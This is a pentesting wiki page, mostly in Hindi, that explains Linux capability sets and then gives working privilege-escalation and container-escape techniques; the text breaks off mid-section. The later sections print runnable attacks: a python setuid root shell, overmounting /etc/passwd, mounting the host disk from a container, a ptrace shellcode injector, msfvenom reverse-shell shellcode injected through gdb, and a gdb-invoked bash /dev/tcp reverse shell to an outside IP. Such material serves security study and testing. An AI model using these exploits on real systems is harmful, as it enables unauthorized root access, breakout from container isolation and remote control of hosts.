# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilities **root privileges को छोटी, अलग-अलग units में विभाजित करती हैं**, जिससे processes के पास privileges का केवल एक subset हो सकता है। इससे अनावश्यक रूप से full root privileges न देने पर risks कम होते हैं।

### The Problem:

- Normal users के पास limited permissions होती हैं, जिससे network socket खोलने जैसे tasks प्रभावित होते हैं, जिनके लिए root access आवश्यक होता है।

### Capability Sets:

1. **Inherited (CapInh)**:

- **Purpose**: Parent process से आगे pass की जाने वाली capabilities निर्धारित करता है।
- **Functionality**: जब कोई नया process बनाया जाता है, तो वह इस set में अपने parent की capabilities inherit करता है। यह process spawns के दौरान कुछ privileges बनाए रखने के लिए उपयोगी है।
- **Restrictions**: कोई process ऐसी capabilities प्राप्त नहीं कर सकता जो उसके parent के पास नहीं थीं।

2. **Effective (CapEff)**:

- **Purpose**: यह दर्शाता है कि कोई process किसी भी समय वास्तव में किन capabilities का उपयोग कर रहा है।
- **Functionality**: यह capabilities का वह set है जिसे kernel विभिन्न operations की permission देने के लिए check करता है। Files के लिए, यह set एक flag हो सकता है जो यह दर्शाता है कि file की permitted capabilities पर effective रूप से विचार किया जाना है या नहीं।
- **Significance**: Immediate privilege checks के लिए effective set महत्वपूर्ण है, क्योंकि यह उन capabilities का active set होता है जिनका process उपयोग कर सकता है।

3. **Permitted (CapPrm)**:

- **Purpose**: उन capabilities का maximum set निर्धारित करता है जिन्हें कोई process possess कर सकता है।
- **Functionality**: कोई process permitted set से किसी capability को अपने effective set में elevate कर सकता है, जिससे उसे उस capability का उपयोग करने की क्षमता मिलती है। वह अपने permitted set से capabilities को drop भी कर सकता है।
- **Boundary**: यह process के पास मौजूद capabilities के लिए upper limit की तरह काम करता है और यह सुनिश्चित करता है कि process अपने predefined privilege scope से आगे न बढ़े।

4. **Bounding (CapBnd)**:

- **Purpose**: Process अपने lifecycle के दौरान कभी भी जो capabilities acquire कर सकता है, उन पर ceiling लगाता है।
- **Functionality**: यदि किसी process के inheritable या permitted set में कोई capability मौजूद हो, तब भी वह उसे acquire नहीं कर सकता, जब तक वह bounding set में भी मौजूद न हो।
- **Use-case**: यह set process की privilege escalation potential को restrict करने के लिए विशेष रूप से उपयोगी है और security की एक अतिरिक्त layer जोड़ता है।

5. **Ambient (CapAmb)**:
- **Purpose**: `execve` system call के दौरान कुछ capabilities को बनाए रखने की अनुमति देता है, जबकि सामान्यतः इसके परिणामस्वरूप process की capabilities पूरी तरह reset हो जाती हैं।
- **Functionality**: यह सुनिश्चित करता है कि associated file capabilities के बिना non-SUID programs कुछ privileges बनाए रख सकें।
- **Restrictions**: इस set में मौजूद capabilities inheritable और permitted sets की constraints के अधीन होती हैं, जिससे यह सुनिश्चित होता है कि वे process के allowed privileges से आगे न बढ़ें।
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
अधिक जानकारी के लिए देखें:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Processes और Binaries Capabilities

### Processes Capabilities

किसी विशेष process की capabilities देखने के लिए /proc directory में **status** file का उपयोग करें। चूंकि यह अधिक details प्रदान करती है, इसलिए इसे केवल Linux capabilities से संबंधित information तक सीमित करते हैं।\
ध्यान दें कि सभी running processes के लिए capability information प्रत्येक thread के आधार पर maintain की जाती है, जबकि file system में मौजूद binaries के लिए यह extended attributes में store होती है।

आप /usr/include/linux/capability.h में defined capabilities देख सकते हैं।

आप current process की capabilities `cat /proc/self/status` या `capsh --print` चलाकर, और अन्य users की capabilities `/proc/<pid>/status` में देख सकते हैं.
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
अधिकांश systems पर यह command 5 lines return करनी चाहिए।

- CapInh = Inherited capabilities
- CapPrm = Permitted capabilities
- CapEff = Effective capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
ये hexadecimal numbers समझ में नहीं आते। capsh utility का उपयोग करके हम इन्हें capabilities name में decode कर सकते हैं।
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
अब `ping` द्वारा उपयोग की जाने वाली **capabilities** को जांचते हैं:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
हालांकि यह काम करता है, एक और आसान तरीका है। किसी running process की capabilities देखने के लिए, बस **getpcaps** tool का उपयोग उसके process ID (PID) के बाद करें। आप process IDs की एक सूची भी दे सकते हैं।
```bash
getpcaps 1234
```
आइए यहाँ `tcpdump` की क्षमताएँ जाँचते हैं, binary को network sniff करने के लिए पर्याप्त capabilities (`cap_net_admin` और `cap_net_raw`) देने के बाद (_tcpdump process 9562 में चल रहा है_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
जैसा कि आप देख सकते हैं, दी गई capabilities किसी binary की capabilities प्राप्त करने के दोनों तरीकों के परिणामों से मेल खाती हैं।\
_getpcaps_ tool किसी विशेष thread के लिए उपलब्ध capabilities को query करने हेतु **capget()** system call का उपयोग करता है। अधिक जानकारी प्राप्त करने के लिए इस system call में केवल PID देना आवश्यक है।

### Binaries की Capabilities

Binaries में ऐसी capabilities हो सकती हैं जिनका उपयोग execution के दौरान किया जा सकता है। उदाहरण के लिए, `ping` binary में `cap_net_raw` capability मिलना बहुत सामान्य है:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
आप **capabilities वाले binaries** को इससे **search** कर सकते हैं:
```bash
getcap -r / 2>/dev/null
```
### capsh के साथ capabilities हटाना

यदि हम \_ping* के लिए CAP*NET_RAW capabilities हटा दें, तो ping उपयोगिता अब काम नहीं करनी चाहिए।
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
_capsh_ के output के अलावा, _tcpdump_ command को स्वयं भी एक error दिखाना चाहिए।

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

यह error स्पष्ट रूप से दिखाता है कि ping command को ICMP socket खोलने की अनुमति नहीं है। अब हम निश्चित रूप से जानते हैं कि यह अपेक्षा के अनुसार काम कर रहा है।

### Capabilities हटाना

आप किसी binary की capabilities हटा सकते हैं באמצעות
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Apparently **it's possible to assign capabilities also to users**. इसका शायद मतलब है कि user द्वारा execute किया गया हर process, user की capabilities का उपयोग कर सकेगा।\
[इस](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [इस ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)और [इस ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) के आधार पर, user को कुछ capabilities देने के लिए कुछ files को configure करना आवश्यक है, लेकिन प्रत्येक user को capabilities assign करने वाली file `/etc/security/capability.conf` होगी।\
File example:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Environment Capabilities

निम्नलिखित program को compile करके ऐसे **environment के अंदर bash shell spawn करना संभव है, जो capabilities प्रदान करता है**।
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**compiled ambient binary द्वारा execute किए गए bash के अंदर** नए **capabilities** को observe करना संभव है (एक regular user के पास "current" section में कोई capability नहीं होगी)।
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> आप **केवल वे capabilities जोड़ सकते हैं जो permitted और inheritable दोनों sets में मौजूद हों**।

### Capability-aware/Capability-dumb binaries

**Capability-aware binaries नए capabilities का उपयोग नहीं करेंगे**, हालांकि **capability-dumb binaries इनका उपयोग करेंगे**, क्योंकि वे इन्हें अस्वीकार नहीं करेंगे। इससे capability-dumb binaries ऐसे special environment के अंदर vulnerable हो जाते हैं, जो binaries को capabilities प्रदान करता है।

## Service Capabilities

By default, **root के रूप में चलने वाली service को सभी capabilities assign की जाएंगी**, और कुछ परिस्थितियों में यह खतरनाक हो सकता है।\
इसलिए, एक **service configuration** file आपको यह **specify** करने देती है कि उसमें कौन-सी **capabilities** होनी चाहिए, और वह **user** भी जो service को execute करे, ताकि service को अनावश्यक privileges के साथ चलाने से बचा जा सके:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker Containers में Capabilities

डिफ़ॉल्ट रूप से Docker containers को कुछ capabilities assign करता है। इन्हें check करना बहुत आसान है; इसके लिए चलाएँ:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities तब उपयोगी होते हैं जब आप **privileged operations करने के बाद अपनी प्रक्रियाओं को प्रतिबंधित करना चाहते हैं** (जैसे chroot सेट करने और किसी socket से bind करने के बाद)। हालांकि, इन्हें malicious commands या arguments पास करके exploit किया जा सकता है, जिन्हें फिर root के रूप में चलाया जाता है।

आप `setcap` का उपयोग करके programs पर capabilities लागू कर सकते हैं, और `getcap` का उपयोग करके इन्हें query कर सकते हैं:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` का अर्थ है कि आप capability को Effective और Permitted के रूप में जोड़ रहे हैं (“-” इसे हटा देगा)।

किसी system या folder में capabilities वाले programs की पहचान करने के लिए:
```bash
getcap -r / 2>/dev/null
```
### Exploitation example

निम्नलिखित example में binary `/usr/bin/python2.6` को privesc के लिए vulnerable पाया गया है:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
`tcpdump` को किसी भी user को packets sniff करने की अनुमति देने के लिए आवश्यक **Capabilities**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "empty" capabilities का विशेष मामला

[Docs से](https://man7.org/linux/man-pages/man7/capabilities.7.html): ध्यान दें कि किसी program file को empty capability sets असाइन किए जा सकते हैं, और इस प्रकार ऐसा set-user-ID-root program बनाना संभव है जो program को execute करने वाली process के effective और saved set-user-ID को 0 में बदल दे, लेकिन उस process को कोई capabilities प्रदान न करे। या, सरल शब्दों में, यदि आपके पास ऐसा binary है जो:

1. root के स्वामित्व में नहीं है
2. इसमें कोई `SUID`/`SGID` bits set नहीं हैं
3. इसमें empty capabilities set है (जैसे: `getcap myelf` `myelf =ep` लौटाता है)

तो **वह binary root के रूप में चलेगा**।

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** एक अत्यंत शक्तिशाली Linux capability है, जिसे अक्सर इसके व्यापक **administrative privileges** के कारण लगभग root-level के बराबर माना जाता है, जैसे devices को mount करना या kernel features में बदलाव करना। हालांकि पूरे systems का simulation करने वाले containers के लिए यह अनिवार्य है, **`CAP_SYS_ADMIN` महत्वपूर्ण security challenges उत्पन्न करता है**, विशेष रूप से containerized environments में, क्योंकि इसमें privilege escalation और system compromise की संभावना होती है। इसलिए, इसके उपयोग के लिए कठोर security assessments और सावधानीपूर्वक management आवश्यक है; application-specific containers में इस capability को drop करना बेहतर होता है, ताकि **principle of least privilege** का पालन किया जा सके और attack surface को न्यूनतम किया जा सके।

**binary के साथ उदाहरण**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Python का उपयोग करके आप एक संशोधित _passwd_ फ़ाइल को वास्तविक _passwd_ फ़ाइल के ऊपर माउंट कर सकते हैं:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
और अंत में संशोधित `passwd` फ़ाइल को `/etc/passwd` पर **mount** करें:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
और आप password "password" का उपयोग करके **`su` as root** कर सकेंगे।

**environment के साथ Example (Docker breakout)**

आप इस command का उपयोग करके docker container के अंदर enabled capabilities check कर सकते हैं:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Inside the previous output में आप देख सकते हैं कि SYS_ADMIN capability enabled है।

- **Mount**

यह Docker container को **host disk को mount करने और उस तक स्वतंत्र रूप से access करने** की अनुमति देता है:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **पूर्ण access**

पिछली method में हम docker host disk को access करने में सफल रहे।\
यदि आपको पता चलता है कि host पर **ssh** server चल रहा है, तो आप **docker host** disk के अंदर एक user **create** कर सकते हैं और SSH के माध्यम से उसे access कर सकते हैं:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**इसका मतलब है कि आप host के अंदर चल रही किसी process में shellcode inject करके container से escape कर सकते हैं।** host के अंदर चल रही processes तक पहुंचने के लिए container को कम से कम **`--pid=host`** के साथ run करना आवश्यक है।

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** `ptrace(2)` द्वारा प्रदान की जाने वाली debugging और system call tracing functionalities तथा `process_vm_readv(2)` और `process_vm_writev(2)` जैसे cross-memory attach calls का उपयोग करने की क्षमता प्रदान करता है। Diagnostic और monitoring उद्देश्यों के लिए शक्तिशाली होने के बावजूद, यदि `CAP_SYS_PTRACE` को `ptrace(2)` पर seccomp filter जैसे restrictive measures के बिना enable किया जाता है, तो यह system security को काफी कमजोर कर सकता है। विशेष रूप से, इसका उपयोग अन्य security restrictions को bypass करने के लिए किया जा सकता है, खासकर seccomp द्वारा लागू restrictions को, जैसा कि [proofs of concept (PoC) like this one](https://gist.github.com/thejh/8346f47e359adecd1d53) द्वारा प्रदर्शित किया गया है।

**binary (python) के साथ Example**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**binary के साथ उदाहरण (gdb)**

`ptrace` capability के साथ `gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
msfvenom से shellcode बनाकर gdb के जरिए memory में inject करें
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
gdb के साथ root process को debug करें और पहले generate की गई gdb lines को copy-paste करें:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**environment के साथ उदाहरण (Docker breakout) - Another gdb Abuse**

यदि **GDB** installed है (या आप इसे उदाहरण के लिए `apk add gdb` या `apt install gdb` से install कर सकते हैं), तो आप **host से किसी process को debug** कर सकते हैं और उससे `system` function call करवा सकते हैं। (इस technique के लिए `SYS_ADMIN` capability भी आवश्यक है)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
आप command का output नहीं देख पाएंगे, लेकिन वह उस process द्वारा execute किया जाएगा (इसलिए rev shell प्राप्त करें)।

> [!WARNING]
> यदि आपको error `"No symbol "system" in current context."` मिलता है, तो gdb के माध्यम से किसी program में shellcode load करने वाला पिछला example देखें।

**Example with environment (Docker breakout) - Shellcode Injection**

आप निम्न command का उपयोग करके docker container के अंदर enabled capabilities check कर सकते हैं:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Host में चल रहे **processes** की सूची बनाएं `ps -eaf`

1. **architecture** प्राप्त करें `uname -m`
2. उस architecture के लिए **shellcode** खोजें ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. किसी process memory में **shellcode** को **inject** करने के लिए एक **program** खोजें ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **program** के अंदर **shellcode** को **modify** करें और इसे **compile** करें `gcc inject.c -o inject`
5. इसे **inject** करें और अपना **shell** प्राप्त करें: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** किसी process को **kernel modules (`init_module(2)`, `finit_module(2)` और `delete_module(2)` system calls) को load और unload करने** की शक्ति देता है, जिससे kernel के core operations तक direct access मिलता है। यह capability गंभीर security risks उत्पन्न करती है, क्योंकि यह kernel में modifications की अनुमति देकर privilege escalation और पूरे system के compromise को संभव बनाती है। इस प्रकार Linux के सभी security mechanisms, जिनमें Linux Security Modules और container isolation शामिल हैं, bypass किए जा सकते हैं।  
**इसका अर्थ है कि आप** **host machine के kernel में kernel modules insert/remove कर सकते हैं।**

**Binary के साथ उदाहरण**

निम्नलिखित उदाहरण में **`python`** binary के पास यह capability है।
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
डिफ़ॉल्ट रूप से, **`modprobe`** command dependency list और map files के लिए directory **`/lib/modules/$(uname -r)`** में जाँच करता है।\
इसका दुरुपयोग करने के लिए, चलिए एक fake **lib/modules** folder बनाते हैं:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
फिर नीचे दिए गए 2 examples में मिलने वाले **kernel module** को compile करें और इसे इस folder में copy करें:
```bash
